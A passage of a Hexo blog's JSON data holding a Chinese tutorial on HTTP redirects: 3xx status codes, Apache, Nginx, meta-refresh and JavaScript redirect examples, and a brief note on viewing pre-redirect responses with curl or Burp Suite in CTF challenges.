Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<h1 id=\"htaccess文件\"><a href=\"#htaccess文件\" class=\"headerlink\" title=\".htaccess文件\"></a>.htaccess文件</h1><p><strong>.htaccess是在Apache HTTP Server这款服务器架设软件下的一个对于系统目录进行各种权限规则设置的一个文件</strong>，存在于Linux操作系统中。</p>\n<p>.htaccess是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。</p>\n<p>可以帮我们实现：网页 301 重定向、自定义 404 错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>\n<p>Apache的标准配置文件是httpd.conf,但这是Apache的配置文件，一旦修改，改的是网络服务器的全局配置。</p>\n"},{"layout":"post","title":"Http重定向","date":"2021-01-10T16:00:00.000Z","description":"详解网页重定向","typora-copy-images-to":"..\\img","typora-root-url":"..","_content":"\n# HTTP重定向以及在CTF中的应用\n\n> URL 重定向，也称为 URL 转发，是一种当实际资源，如单个页面、表单或者整个 Web 应用被迁移到新的 URL 下的时候，保持（原有）链接可用的技术。HTTP 协议提供了一种特殊形式的响应—— HTTP 重定向（HTTP redirects   响应码300系列）来执行此类操作。\n\n网页重定向可实现许多目标：\n\n- 站点维护或停机期间的临时重定向。\n- 永久重定向将在更改站点的URL，上传文件时的进度页等之后保留现有的链接/书签。\n- 作为上传文件时的表示进度的页面。\n\n## 原理\n\n在 HTTP 协议中，重定向操作由服务器通过发送特殊的响应（即 redirects）而触发。HTTP 协议的重定向响应的状态码为 3xx 。\n\n浏览器在接收到重定向响应的时候，会采用该响应提供的新的 URL ，并立即进行加载，要注意的是，**跳转是由浏览器完成的，所以给非浏览器客户端发送跳转信息是可能发生错误的**\n\n大多数情况下，除了会有一小部分性能损失之外，重定向操作对于用户来说是不可见的。\n\n\n![img](https://mdn.mozillademos.org/files/13785/HTTPRedirect.png)\n\n不同类型的重定向映射可以划分为三个类别：\n\n1. 永久重定向\n2. 临时重定向\n3. 特殊重定向\n\n### 永久重定义\n\n这种重定向操作是永久性的。它表示原 URL 不应再被使用，而应该优先选用新的 URL。搜索引擎机器人会在遇到该状态码时触发更新操作，在其索引库中修改与该资源相关的 URL 。\n\n| 编码  | 含义               | 处理方法                                                     | 典型应用场景              |\n| :---- | :----------------- | :----------------------------------------------------------- | :------------------------ |\n| `301` | Moved Permanently  | [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET) 方法不会发生变更，其他方法有可能会变更为 [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET) 方法。 | 网站重构。                |\n| `308` | Permanent Redirect | 方法和消息主体都不发生变化。                                 | 网站重构，用于非GET方法。 |\n\n### 临时重定向\n\n有时候请求的资源无法从其标准地址访问，但是却可以从另外的地方访问。在这种情况下可以使用临时重定向。\n\n搜索引擎不会记录该新的、临时的链接。在创建、更新或者删除资源的时候，临时重定向也可以用于显示临时性的进度页面。\n\n| 编码  | 含义                 | 处理方法                                                     | 典型应用场景                                                 |\n| :---- | :------------------- | :----------------------------------------------------------- | :----------------------------------------------------------- |\n| `302` | `Found`              | GET 方法不会发生变更，其他方法有可能会变更为 GET 方法。 | 由于不可预见的原因该页面暂不可用。在这种情况下，搜索引擎不会更新它们的链接。 |\n| `303` | `See Other`          | GET 方法不会发生变更，其他方法会**变更**为 GET 方法（消息主体会丢失）。 | 用于PUT 或 POST 请求完成之后进行页面跳转来防止由于页面刷新导致的操作的重复触发。 |\n| `307` | `Temporary Redirect` | 方法和消息主体都不发生变化。                                 | 由于不可预见的原因该页面暂不可用。在这种情况下，搜索引擎不会更新它们的链接。当站点支持非 GET 方法的链接或操作的时候，该状态码优于 302 状态码。 |\n\n该规范无意使方法发生改变，但在实际应用中用户代理会这么做。 307 状态码被创建用来消除在使用非 GET 方法时的歧义行为。\n\n### 特殊重定向\n\n除了上述两种常见的重定向之外，还有两种特殊的重定向。[`304`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/304) （Not Modified，资源未被修改）会使页面跳转到本地陈旧的缓存版本当中（该缓存已过期(?)），而 [`300`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/300) （Multiple Choice，多项选择） 则是一种手工重定向：以 Web 页面形式呈现在浏览器中的消息主体包含了一个可能的重定向链接的列表，用户可以从中进行选择。\n\n| 编码  | 含义              | 典型应用场景                                                 |\n| :---- | :---------------- | :----------------------------------------------------------- |\n| `300` | `Multiple Choice` | 不常用：所有的选项在消息主体的 HTML 页面中列出。鼓励在 [`Link`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Link) 头部加入机器可读的 `rel=alternate` |\n| `304` | `Not Modified`    | 发送用于重新验证的条件请求。表示缓存的响应仍然是新鲜的并且可以使用。 |\n\n\n\n## 设置重定向的方法\n\n### 1.在服务器中设置重定向\n\n#### Apache\n\n重定向映射可以在服务器的配置文件中设置，也可以在每一个文件目录的 .htaccess 文件中设置。\n\n在配置文件中：\n\n[mod_alias](https://httpd.apache.org/docs/current/mod/mod_alias.html) 模块提供了 `Redirect` 和 `Redirect_Match` 两种指令来设置 [`302`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/302) 响应（默认值）：\n\n```\n<VirtualHost *:443>\n\tServerName example.com\n\tRedirect / https://www.example.com\n</VirtualHost>\n```\n\nURL `https://example.com/` 会被重定向至 `https://www.example.com/` ，URL 下的任何文件或目录也将重定向到该 URL（`https://example.com/some-page` 将重定向至 `https://www.example.com/some-page`）。\n\n`Redirect_Match` 指令的功能与之类似，不同之处在于它可以通过[正则表达式](https://wiki.developer.mozilla.org/en-US/docs/Glossary/Regular_expression)来指定一批受影响的 URL ：\n\n```\nRedirectMatch ^/images/(.*)$ http://images.example.com/$1\n```\n\n位于 `images/` 文件夹下的所有文档都会被重定向至新的域名。\n\n如果你不想要设置临时跳转，那么可是使用额外的参数（使用 HTTP 状态码或者 permanent 关键字）来进行设置：\n\n```\nRedirect permanent / https://www.example.com\n# …acts the same as:\nRedirect 301 / https://www.example.com\n```\n\n[mod_rewrite](http://httpd.apache.org/docs/current/mod/mod_rewrite.html) 模块也可以用来设置重定向映射。它应用起来更灵活，但也更加复杂。\n\n#### Nginx\n\n在 Nginx 的配置文件中，编辑或创建一个服务器模块来进行重定向设置：\n\n```\nserver {\n\tlisten 80;\n\tserver_name example.com;\n\treturn 301 $scheme://www.example.com$request_uri;\n}\n```\n\n可以使用 rewrite 指令来针对一个文件目录或者一部分页面应用重定向设置：\n\n```\nrewrite ^/images/(.*)$ http://images.example.com/$1 redirect;\nrewrite ^/images/(.*)$ http://images.example.com/$1 permanent;\n```\n\n#### IIS\n\n在 IIS 中，可以使用 `<httpRedirect>` 元素来配置重定向映射。\n\n\n\n## 其它方法设置重定向\n\nHTTP 协议中重定向机制并非唯一的重定向映射的方式。其他两种方法包括：\n\n1. 借助 HTML 的 meta 元素的 HTML 重定向机制\n2. 借助 [DOM](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model) 的 JavaScript 重定向机制。\n\n### HTML 重定向机制\n\nHTTP 协议中重定向机制是应该优先采用的创建重定向映射的方式，但是有时候 Web 开发者对于服务器没有控制权，或者无法对其进行配置。针对这些特定的应用情景，Web 开发者可以在精心制作的 HTML 页面的`head`部分添加一个` meta` 元素，并将其 `http-equiv` 属性的值设置为 `refresh` 。当显示页面的时候，浏览器会检测该元素，然后跳转到指定的页面。\n\n```\n<head>\n  <meta http-equiv=\"Refresh\" content=\"0; URL=http://example.com/\" />\n</head>\n```\n\n`content` 属性的值开头是一个数字，指示浏览器在等待该数字表示的秒数之后再进行跳转。建议始终将其设置为 0 来获取更好的可访问性。\n\n显然，该方法仅适用于 HTML 页面（或类似的页面），然而并不能应用于图片或者其他类型的内容。\n\n注意这种机制会使浏览器的回退按钮失效：可以返回含有这个头部的页面，但是又会立即跳转。\n\n### JavaScript 重定向机制\n\n在 JavaScript 中，重定向机制的原理是设置 `window.location` 的属性值，然后加载新的页面。\n\n```\nwindow.location = \"http://example.com/\";\n```\n\n与 HTML 重定向机制类似，这种方式并不适用于所有类型的资源，并且显然只有在支持 JavaScript 的客户端上才能使用。另外一方面，它也提供了更多的可能性，比如在只有满足了特定的条件的情况下才可以触发重定向机制的场景。\n\n### 优先级\n\n由于存在上述三种 URL 重定向机制，那么在多种方法同时设定的情况下，哪种方法会首先起作用呢？优先级顺序如下：\n\n1. HTTP 协议的重定向机制永远最先触发，即便是在没有传送任何页面——也就没有页面被（客户端）读取——的情况下。\n2. HTML 的重定向机制 `meta` 会在 HTTP 协议重定向机制未设置的情况下触发。\n3. JavaScript 的重定向机制总是作为最后诉诸的手段，并且只有在客户端开启了 JavaScript 的情况下才起作用。\n\n任何情况下，只要有可能，就应该采用 HTTP 协议的重定向机制，而不要使用 `meta`标签。假如开发人员修改了 HTTP 重定向映射而忘记修改 HTML 页面的重定向映射，那么二者就会不一致，最终结果或者出现无限循环，或者导致其他严重事故的发生。\n\n## 应用场景\n\n有以下几种应用场景可以使用重定向机制，但是需要注意应该尽可能地限制其使用数量，因为每一次重定向都会降低使用效率。\n\n### 域名别称\n\n理想情况下，一项资源只有一个访问位置，也就是只有一个 URL 。但是由于种种原因，需要为资源设定不同的名称（即不同的域名，例如带有和不带有 www 前缀的URL，以及简短易记的 URL 等）。在这种情况下，实用的方法是将其重定向到那个实际的（标准的）URL，而不是复制资源。\n\n在以下几种情况下可以使用域名别称：\n\n- **扩大站点的用户覆盖面**\n\n  一个常见的场景是，假如站点位于 `www.example.com` 域名下，那么通过 `example.com `也应该可以访问到。这种情况下，可以建立从 `example.com` 的页面到 `www.example.com` 的重定向映射。此外还可以提供常见的同义词，或者该域名容易导致的拼写错误的域名别称。\n\n- **迁移到另外一个域名**\n\n  例如，公司改名后，你希望用户在搜索旧名称的时候，依然可以访问到应用了新名称的站点。\n\n- **强制使用 HTTPS 协议**\n\n  对于 HTTP 版本站点的请求会被重定向至采用了 HTTPS 协议的版本。\n\n- **保持链接有效**\n\n当你重构 Web 站点的时候，资源的 URL 会发生改变。即便是你可以更新站点内部的链接来适应新的命名体系，但无法控制被外部资源使用的 URL 。\n\n你并不想因此而使旧链接失效，因为它们会为你带来宝贵的用户（并且帮助优化你的SEO），所以需要建立从旧链接到新链接的重定向映射。\n\n即便是这项技术可以同样应用于内部链接，但是应该尽量避免内部重定向映射。重定向机制会带来相当大的性能开销（额外的 HTTP 请求），所以如果你可以通过修复链接来避免的话，那么就应该将其修复。\n\n### 对于不安全请求的临时响应\n\n不安全请求会修改服务器端的状态，应该避免用户无意的重复操作。\n\n通常，你并不想要你的用户重复发送  PUT、POST 或 DELETE 请求。假如你仅仅为该类请求返回响应的话，简单地点击刷新按钮就会（可能会有一个确认信息）导致请求的重复发送。\n\n在这种情况下，服务器可以返回一个 [`303`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/303) (See Other) 响应，其中含有合适的响应信息。如果刷新按钮被点击的话，只会导致该页面被刷新，而不会重复提交不安全的请求。\n\n### 对于耗时请求的临时响应\n\n一些请求的处理会需要比较长的时间，比如有时候 DELETE 请求会被安排为稍后处理。在这种情况下，会返回一个 [`303`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/303) (See Other)  重定向响应，该响应链接到一个页面，表示请求的操作已经被列入计划，并且最终会通知用户操作的进展情况，或者允许用户将其取消。\n\n## 在CTF中的应用\n\n### 使用curl工具\n\n如果需要获得跳转前的页面中的信息，使用curl命令行工具是非常常见的，因为curl默认是不跟随跳转的，除非添加了-L参数才会跟随跳转。\n\n### 使用bp抓包\n\n这个方法也很简单，抓包，放入Repeater模块，发送过去就行了，它会把服务器发过来的包都截下来的，因为重定向是由浏览器执行的，所以信息都仍然保留在服务器回复的报文里。","source":"_posts/2021-1-11-HTTP重定向.md","raw":"---\nlayout: post\ntitle: Http重定向\ndate: 2021-1-11\ncategories: blog\ntags: [web,300状态码]\ndescription: 详解网页重定向\ntypora-copy-images-to: ..\\img\ntypora-root-url: ..\n---\n\n# HTTP重定向以及在CTF中的应用\n\n> URL 重定向，也称为 URL 转发，是一种当实际资源，如单个页面、表单或者整个 Web 应用被迁移到新的 URL 下的时候，保持（原有）链接可用的技术。HTTP 协议提供了一种特殊形式的响应—— HTTP 重定向（HTTP redirects   响应码300系列）来执行此类操作。\n\n网页重定向可实现许多目标：\n\n- 站点维护或停机期间的临时重定向。\n- 永久重定向将在更改站点的URL，上传文件时的进度页等之后保留现有的链接/书签。\n- 作为上传文件时的表示进度的页面。\n\n## 原理\n\n在 HTTP 协议中，重定向操作由服务器通过发送特殊的响应（即 redirects）而触发。HTTP 协议的重定向响应的状态码为 3xx 。\n\n浏览器在接收到重定向响应的时候，会采用该响应提供的新的 URL ，并立即进行加载，要注意的是，**跳转是由浏览器完成的，所以给非浏览器客户端发送跳转信息是可能发生错误的**\n\n大多数情况下，除了会有一小部分性能损失之外，重定向操作对于用户来说是不可见的。\n\n\n![img](https://mdn.mozillademos.org/files/13785/HTTPRedirect.png)\n\n不同类型的重定向映射可以划分为三个类别：\n\n1. 永久重定向\n2. 临时重定向\n3. 特殊重定向\n\n### 永久重定义\n\n这种重定向操作是永久性的。它表示原 URL 不应再被使用，而应该优先选用新的 URL。搜索引擎机器人会在遇到该状态码时触发更新操作，在其索引库中修改与该资源相关的 URL 。\n\n| 编码  | 含义               | 处理方法                                                     | 典型应用场景              |\n| :---- | :----------------- | :----------------------------------------------------------- | :------------------------ |\n| `301` | Moved Permanently  | [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET) 方法不会发生变更，其他方法有可能会变更为 [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET) 方法。 | 网站重构。                |\n| `308` | Permanent Redirect | 方法和消息主体都不发生变化。                                 | 网站重构，用于非GET方法。 |\n\n### 临时重定向\n\n有时候请求的资源无法从其标准地址访问，但是却可以从另外的地方访问。在这种情况下可以使用临时重定向。\n\n搜索引擎不会记录该新的、临时的链接。在创建、更新或者删除资源的时候，临时重定向也可以用于显示临时性的进度页面。\n\n| 编码  | 含义                 | 处理方法                                                     | 典型应用场景                                                 |\n| :---- | :------------------- | :----------------------------------------------------------- | :----------------------------------------------------------- |\n| `302` | `Found`              | GET 方法不会发生变更，其他方法有可能会变更为 GET 方法。 | 由于不可预见的原因该页面暂不可用。在这种情况下，搜索引擎不会更新它们的链接。 |\n| `303` | `See Other`          | GET 方法不会发生变更，其他方法会**变更**为 GET 方法（消息主体会丢失）。 | 用于PUT 或 POST 请求完成之后进行页面跳转来防止由于页面刷新导致的操作的重复触发。 |\n| `307` | `Temporary Redirect` | 方法和消息主体都不发生变化。                                 | 由于不可预见的原因该页面暂不可用。在这种情况下，搜索引擎不会更新它们的链接。当站点支持非 GET 方法的链接或操作的时候，该状态码优于 302 状态码。 |\n\n该规范无意使方法发生改变，但在实际应用中用户代理会这么做。 307 状态码被创建用来消除在使用非 GET 方法时的歧义行为。\n\n### 特殊重定向\n\n除了上述两种常见的重定向之外，还有两种特殊的重定向。[`304`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/304) （Not Modified，资源未被修改）会使页面跳转到本地陈旧的缓存版本当中（该缓存已过期(?)），而 [`300`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/300) （Multiple Choice，多项选择） 则是一种手工重定向：以 Web 页面形式呈现在浏览器中的消息主体包含了一个可能的重定向链接的列表，用户可以从中进行选择。\n\n| 编码  | 含义              | 典型应用场景                                                 |\n| :---- | :---------------- | :----------------------------------------------------------- |\n| `300` | `Multiple Choice` | 不常用：所有的选项在消息主体的 HTML 页面中列出。鼓励在 [`Link`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Link) 头部加入机器可读的 `rel=alternate` |\n| `304` | `Not Modified`    | 发送用于重新验证的条件请求。表示缓存的响应仍然是新鲜的并且可以使用。 |\n\n\n\n## 设置重定向的方法\n\n### 1.在服务器中设置重定向\n\n#### Apache\n\n重定向映射可以在服务器的配置文件中设置，也可以在每一个文件目录的 .htaccess 文件中设置。\n\n在配置文件中：\n\n[mod_alias](https://httpd.apache.org/docs/current/mod/mod_alias.html) 模块提供了 `Redirect` 和 `Redirect_Match` 两种指令来设置 [`302`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/302) 响应（默认值）：\n\n```\n<VirtualHost *:443>\n\tServerName example.com\n\tRedirect / https://www.example.com\n</VirtualHost>\n```\n\nURL `https://example.com/` 会被重定向至 `https://www.example.com/` ，URL 下的任何文件或目录也将重定向到该 URL（`https://example.com/some-page` 将重定向至 `https://www.example.com/some-page`）。\n\n`Redirect_Match` 指令的功能与之类似，不同之处在于它可以通过[正则表达式](https://wiki.developer.mozilla.org/en-US/docs/Glossary/Regular_expression)来指定一批受影响的 URL ：\n\n```\nRedirectMatch ^/images/(.*)$ http://images.example.com/$1\n```\n\n位于 `images/` 文件夹下的所有文档都会被重定向至新的域名。\n\n如果你不想要设置临时跳转，那么可是使用额外的参数（使用 HTTP 状态码或者 permanent 关键字）来进行设置：\n\n```\nRedirect permanent / https://www.example.com\n# …acts the same as:\nRedirect 301 / https://www.example.com\n```\n\n[mod_rewrite](http://httpd.apache.org/docs/current/mod/mod_rewrite.html) 模块也可以用来设置重定向映射。它应用起来更灵活，但也更加复杂。\n\n#### Nginx\n\n在 Nginx 的配置文件中，编辑或创建一个服务器模块来进行重定向设置：\n\n```\nserver {\n\tlisten 80;\n\tserver_name example.com;\n\treturn 301 $scheme://www.example.com$request_uri;\n}\n```\n\n可以使用 rewrite 指令来针对一个文件目录或者一部分页面应用重定向设置：\n\n```\nrewrite ^/images/(.*)$ http://images.example.com/$1 redirect;\nrewrite ^/images/(.*)$ http://images.example.com/$1 permanent;\n```\n\n#### IIS\n\n在 IIS 中，可以使用 `<httpRedirect>` 元素来配置重定向映射。\n\n\n\n## 其它方法设置重定向\n\nHTTP 协议中重定向机制并非唯一的重定向映射的方式。其他两种方法包括：\n\n1. 借助 HTML 的 meta 元素的 HTML 重定向机制\n2. 借助 [DOM](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model) 的 JavaScript 重定向机制。\n\n### HTML 重定向机制\n\nHTTP 协议中重定向机制是应该优先采用的创建重定向映射的方式，但是有时候 Web 开发者对于服务器没有控制权，或者无法对其进行配置。针对这些特定的应用情景，Web 开发者可以在精心制作的 HTML 页面的`head`部分添加一个` meta` 元素，并将其 `http-equiv` 属性的值设置为 `refresh` 。当显示页面的时候，浏览器会检测该元素，然后跳转到指定的页面。\n\n```\n<head>\n  <meta http-equiv=\"Refresh\" content=\"0; URL=http://example.com/\" />\n</head>\n```\n\n`content` 属性的值开头是一个数字，指示浏览器在等待该数字表示的秒数之后再进行跳转。建议始终将其设置为 0 来获取更好的可访问性。\n\n显然，该方法仅适用于 HTML 页面（或类似的页面），然而并不能应用于图片或者其他类型的内容。\n\n注意这种机制会使浏览器的回退按钮失效：可以返回含有这个头部的页面，但是又会立即跳转。\n\n### JavaScript 重定向机制\n\n在 JavaScript 中，重定向机制的原理是设置 `window.location` 的属性值，然后加载新的页面。\n\n```\nwindow.location = \"http://example.com/\";\n```\n\n与 HTML 重定向机制类似，这种方式并不适用于所有类型的资源，并且显然只有在支持 JavaScript 的客户端上才能使用。另外一方面，它也提供了更多的可能性，比如在只有满足了特定的条件的情况下才可以触发重定向机制的场景。\n\n### 优先级\n\n由于存在上述三种 URL 重定向机制，那么在多种方法同时设定的情况下，哪种方法会首先起作用呢？优先级顺序如下：\n\n1. HTTP 协议的重定向机制永远最先触发，即便是在没有传送任何页面——也就没有页面被（客户端）读取——的情况下。\n2. HTML 的重定向机制 `meta` 会在 HTTP 协议重定向机制未设置的情况下触发。\n3. JavaScript 的重定向机制总是作为最后诉诸的手段，并且只有在客户端开启了 JavaScript 的情况下才起作用。\n\n任何情况下，只要有可能，就应该采用 HTTP 协议的重定向机制，而不要使用 `meta`标签。假如开发人员修改了 HTTP 重定向映射而忘记修改 HTML 页面的重定向映射，那么二者就会不一致，最终结果或者出现无限循环，或者导致其他严重事故的发生。\n\n## 应用场景\n\n有以下几种应用场景可以使用重定向机制，但是需要注意应该尽可能地限制其使用数量，因为每一次重定向都会降低使用效率。\n\n### 域名别称\n\n理想情况下，一项资源只有一个访问位置，也就是只有一个 URL 。但是由于种种原因，需要为资源设定不同的名称（即不同的域名，例如带有和不带有 www 前缀的URL，以及简短易记的 URL 等）。在这种情况下，实用的方法是将其重定向到那个实际的（标准的）URL，而不是复制资源。\n\n在以下几种情况下可以使用域名别称：\n\n- **扩大站点的用户覆盖面**\n\n  一个常见的场景是，假如站点位于 `www.example.com` 域名下，那么通过 `example.com `也应该可以访问到。这种情况下，可以建立从 `example.com` 的页面到 `www.example.com` 的重定向映射。此外还可以提供常见的同义词，或者该域名容易导致的拼写错误的域名别称。\n\n- **迁移到另外一个域名**\n\n  例如，公司改名后，你希望用户在搜索旧名称的时候，依然可以访问到应用了新名称的站点。\n\n- **强制使用 HTTPS 协议**\n\n  对于 HTTP 版本站点的请求会被重定向至采用了 HTTPS 协议的版本。\n\n- **保持链接有效**\n\n当你重构 Web 站点的时候，资源的 URL 会发生改变。即便是你可以更新站点内部的链接来适应新的命名体系，但无法控制被外部资源使用的 URL 。\n\n你并不想因此而使旧链接失效，因为它们会为你带来宝贵的用户（并且帮助优化你的SEO），所以需要建立从旧链接到新链接的重定向映射。\n\n即便是这项技术可以同样应用于内部链接，但是应该尽量避免内部重定向映射。重定向机制会带来相当大的性能开销（额外的 HTTP 请求），所以如果你可以通过修复链接来避免的话，那么就应该将其修复。\n\n### 对于不安全请求的临时响应\n\n不安全请求会修改服务器端的状态，应该避免用户无意的重复操作。\n\n通常，你并不想要你的用户重复发送  PUT、POST 或 DELETE 请求。假如你仅仅为该类请求返回响应的话，简单地点击刷新按钮就会（可能会有一个确认信息）导致请求的重复发送。\n\n在这种情况下，服务器可以返回一个 [`303`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/303) (See Other) 响应，其中含有合适的响应信息。如果刷新按钮被点击的话，只会导致该页面被刷新，而不会重复提交不安全的请求。\n\n### 对于耗时请求的临时响应\n\n一些请求的处理会需要比较长的时间，比如有时候 DELETE 请求会被安排为稍后处理。在这种情况下，会返回一个 [`303`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/303) (See Other)  重定向响应，该响应链接到一个页面，表示请求的操作已经被列入计划，并且最终会通知用户操作的进展情况，或者允许用户将其取消。\n\n## 在CTF中的应用\n\n### 使用curl工具\n\n如果需要获得跳转前的页面中的信息，使用curl命令行工具是非常常见的，因为curl默认是不跟随跳转的，除非添加了-L参数才会跟随跳转。\n\n### 使用bp抓包\n\n这个方法也很简单，抓包，放入Repeater模块，发送过去就行了，它会把服务器发过来的包都截下来的，因为重定向是由浏览器执行的，所以信息都仍然保留在服务器回复的报文里。","slug":"2021-1-11-HTTP重定向","published":1,"updated":"2021-01-14T10:16:42.775Z","comments":1,"photos":[],"link":"","_id":"ckkntx9kh002exov7a9bz1cav","content":"<h1 id=\"HTTP重定向以及在CTF中的应用\"><a href=\"#HTTP重定向以及在CTF中的应用\" class=\"headerlink\" title=\"HTTP重定向以及在CTF中的应用\"></a>HTTP重定向以及在CTF中的应用</h1><blockquote>\n<p>URL 重定向，也称为 URL 转发，是一种当实际资源，如单个页面、表单或者整个 Web 应用被迁移到新的 URL 下的时候，保持（原有）链接可用的技术。HTTP 协议提供了一种特殊形式的响应—— HTTP 重定向（HTTP redirects   响应码300系列）来执行此类操作。</p>\n</blockquote>\n<p>网页重定向可实现许多目标：</p>\n<ul>\n<li>站点维护或停机期间的临时重定向。</li>\n<li>永久重定向将在更改站点的URL，上传文件时的进度页等之后保留现有的链接/书签。</li>\n<li>作为上传文件时的表示进度的页面。</li>\n</ul>\n<h2 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h2><p>在 HTTP 协议中，重定向操作由服务器通过发送特殊的响应（即 redirects）而触发。HTTP 协议的重定向响应的状态码为 3xx 。</p>\n<p>浏览器在接收到重定向响应的时候，会采用该响应提供的新的 URL ，并立即进行加载，要注意的是，<strong>跳转是由浏览器完成的，所以给非浏览器客户端发送跳转信息是可能发生错误的</strong></p>\n<p>大多数情况下，除了会有一小部分性能损失之外，重定向操作对于用户来说是不可见的。</p>\n<p><img src=\"https://mdn.mozillademos.org/files/13785/HTTPRedirect.png\" alt=\"img\"></p>\n<p>不同类型的重定向映射可以划分为三个类别：</p>\n<ol>\n<li>永久重定向</li>\n<li>临时重定向</li>\n<li>特殊重定向</li>\n</ol>\n<h3 id=\"永久重定义\"><a href=\"#永久重定义\" class=\"headerlink\" title=\"永久重定义\"></a>永久重定义</h3><p>这种重定向操作是永久性的。它表示原 URL 不应再被使用，而应该优先选用新的 URL。搜索引擎机器人会在遇到该状态码时触发更新操作，在其索引库中修改与该资源相关的 URL 。</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">编码</th>\n<th align=\"left\">含义</th>\n<th align=\"left\">处理方法</th>\n<th align=\"left\">典型应用场景</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\"><code>301</code></td>\n<td align=\"left\">Moved Permanently</td>\n<td align=\"left\"><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET\" target=\"_blank\" rel=\"noopener\"><code>GET</code></a> 方法不会发生变更，其他方法有可能会变更为 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET\" target=\"_blank\" rel=\"noopener\"><code>GET</code></a> 方法。</td>\n<td align=\"left\">网站重构。</td>\n</tr>\n<tr>\n<td align=\"left\"><code>308</code></td>\n<td align=\"left\">Permanent Redirect</td>\n<td align=\"left\">方法和消息主体都不发生变化。</td>\n<td align=\"left\">网站重构，用于非GET方法。</td>\n</tr>\n</tbody></table>\n<h3 id=\"临时重定向\"><a href=\"#临时重定向\" class=\"headerlink\" title=\"临时重定向\"></a>临时重定向</h3><p>有时候请求的资源无法从其标准地址访问，但是却可以从另外的地方访问。在这种情况下可以使用临时重定向。</p>\n<p>搜索引擎不会记录该新的、临时的链接。在创建、更新或者删除资源的时候，临时重定向也可以用于显示临时性的进度页面。</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">编码</th>\n<th align=\"left\">含义</th>\n<th align=\"left\">处理方法</th>\n<th align=\"left\">典型应用场景</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\"><code>302</code></td>\n<td align=\"left\"><code>Found</code></td>\n<td align=\"left\">GET 方法不会发生变更，其他方法有可能会变更为 GET 方法。</td>\n<td align=\"left\">由于不可预见的原因该页面暂不可用。在这种情况下，搜索引擎不会更新它们的链接。</td>\n</tr>\n<tr>\n<td align=\"left\"><code>303</code></td>\n<td align=\"left\"><code>See Other</code></td>\n<td align=\"left\">GET 方法不会发生变更，其他方法会<strong>变更</strong>为 GET 方法（消息主体会丢失）。</td>\n<td align=\"left\">用于PUT 或 POST 请求完成之后进行页面跳转来防止由于页面刷新导致的操作的重复触发。</td>\n</tr>\n<tr>\n<td align=\"left\"><code>307</code></td>\n<td align=\"left\"><code>Temporary Redirect</code></td>\n<td align=\"left\">方法和消息主体都不发生变化。</td>\n<td align=\"left\">由于不可预见的原因该页面暂不可用。在这种情况下，搜索引擎不会更新它们的链接。当站点支持非 GET 方法的链接或操作的时候，该状态码优于 302 状态码。</td>\n</tr>\n</tbody></table>\n<p>该规范无意使方法发生改变，但在实际应用中用户代理会这么做。 307 状态码被创建用来消除在使用非 GET 方法时的歧义行为。</p>\n<h3 id=\"特殊重定向\"><a href=\"#特殊重定向\" class=\"headerlink\" 